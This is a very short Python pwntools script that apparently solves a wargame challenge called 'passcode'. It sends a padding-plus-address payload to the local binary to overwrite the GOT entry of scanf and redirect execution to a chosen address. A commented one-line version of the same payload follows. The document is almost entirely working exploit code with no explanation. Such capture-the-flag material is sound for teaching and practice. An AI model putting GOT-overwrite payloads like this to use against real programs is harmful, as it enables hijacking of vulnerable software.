# coding: utf-8
from pwn import *
context.log_level = 'debug'
io = process('./passcode')
io.sendline('A'*96+'\x00\xa0\x04\x08'+str(0x080485d7)+'\n') #hack got of scanf
io.recv()




#python -c "print 'A'*96+'\x00\xa0\x04\x08'+str(0x080485d7)+'\n'"